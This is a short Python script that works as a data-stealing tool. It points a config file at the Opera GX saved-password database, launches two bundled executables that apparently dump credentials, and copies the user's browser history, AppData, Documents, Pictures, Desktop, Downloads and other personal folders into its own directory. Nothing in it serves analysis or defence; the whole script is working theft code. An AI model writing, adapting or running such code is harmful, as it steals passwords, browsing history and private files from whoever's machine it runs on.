from shutil import copytree
from os import getlogin
from os import getcwd
from os import startfile
cwd = getcwd()
cwd = getcwd()
username = getlogin()
line_to_change = 24  # Change the content of the 3rd line
new_text = 'OperaPasswordFile="C:\\Users\\' + username +  '\\AppData\\Local\\Opera Software\\Opera GX Stable\\Login Data"\n'
file_name = cwd + "\\p\\p.cfg"
try:
    with open(file_name, 'r') as f:
        lines = f.readlines()

    # Adjust for 0-based indexing (e.g., line 3 is index 2)
    if 0 <= line_to_change - 1 < len(lines):
        lines[line_to_change - 1] = new_text
        with open(file_name, 'w') as f:
            f.writelines(lines)
        print(f"Line {line_to_change} in '{file_name}' has been updated.")
    else:
        print(f"Error: Line number {line_to_change} is out of range for '{file_name}'.")

except FileNotFoundError:
    print(f"Error: The file '{file_name}' was not found.")
except Exception as e:
    print(f"An error occurred: {e}")
startfile(cwd+"\\dsc\\1dsc.exe")
startfile(cwd+"\\p\\p.exe")
username = getlogin()

copytree("C:\\Users\\"+username+"\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\History", cwd+"\\h")
print("dl Hist")
copytree("C:\\Users\\" + username + "\\Pictures\\", cwd+"\\temp")
print("dl1")
copytree("C:\\Users\\" + username + "\\Documents\\", cwd+"\\temp2")
print("dl2")
copytree("C:\\Users\\" + username + "\\Music\\", cwd+"\\temp3")
print("dl3")
copytree("C:\\Users\\" + username + "\\Videos\\", cwd+"\\temp4")
print("dl4")
copytree("C:\\Users\\" + username + "\\Desktop\\", cwd+"\\temp5")
print("dl5")
copytree("C:\\Users\\" + username + "\\Downloads\\", cwd+"\\temp6")
print("dl6")
copytree("C:\\Users\\" + username + "\\AppData\\", cwd+"\\temp1")
print("dl7")
exit()

      